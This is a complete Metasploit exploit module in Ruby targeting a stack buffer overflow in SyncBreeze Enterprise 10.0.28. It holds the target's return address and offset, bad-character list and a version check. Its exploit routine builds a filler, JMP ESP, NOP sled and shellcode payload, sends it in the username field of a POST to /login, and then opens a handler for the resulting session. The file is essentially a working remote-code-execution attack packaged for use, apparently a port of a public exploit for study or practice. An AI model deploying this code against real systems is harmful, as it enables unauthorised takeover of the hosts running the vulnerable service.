class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SyncBreeze Enterprise Buffer Overflow',
      'Description'    => %q(port of SyncBreeze Enterprise 10.0.28 stackbased buffer overflow),
      'License'        => MSF_LICENSE,
      'Author'         => [ 'p4yl0ad@protonmail.com', 'p4yl0ad' ],
      'References'     => 
        [
          [ 'EDB', '42886' ]
        ],
      'DefaultOptions' =>
        {
        'EXITFUNC'       => 'thread'
        },
      'Platform'       => 'win',
      'Payload'        =>
        {
        'BadChars' => "\x00\x0a\x0d\x25\x26\x2b\x3d",
        'Space'      => 500
        },
      'Targets'        =>
        [
          [ 'SyncBreeze Enterprise 10.0.28',
          {
            'Ret' => 0x10090c83, # JMP ESP --libssp.dll
            'Offset' => 780
          }
        ]
        ],
      'Privileged'     => true,
      'DisclosureDate' => 'Oct 20 2019',
      'DefaultTarget'  => 0))

    register_options([Opt::RPORT(80)])
  end
  

  def check
    res = send_request_cgi(
      'uri'    =>  '/',
      'method' =>  'GET'
    )

    if res && res.code == 200
      product_name = res.body.scan(/(Sync Breeze Enterprise v[^<]*)/i).flatten.first
      if product_name =~ /10\.0\.28/
        return Exploit::CheckCode::Appears
      end
    end
    
    return Exploit::CheckCode::Safe
    
  end
  
  def exploit
    print_status("Generating exploit...")
    exp = rand_text_alpha(target['Offset']) # random text filler 
    exp << [target.ret].pack('V') # little endian packing of ret address
    exp << rand_text(4) # more filler post jump
    exp << make_nops(10) # NOP sled to make sure we land on jmp to shellcode
    exp << payload.encoded
    print_status("Sending exploit...")

    send_request_cgi(
      'uri' =>  '/login',
      'method' =>  'POST',
      'connection' =>  'keep-alive',
      'vars_post' => {
        'username' => "#{exp}",
        'password' => "fakepsw"
      }
    )
    handler
    disconnect
  end
end
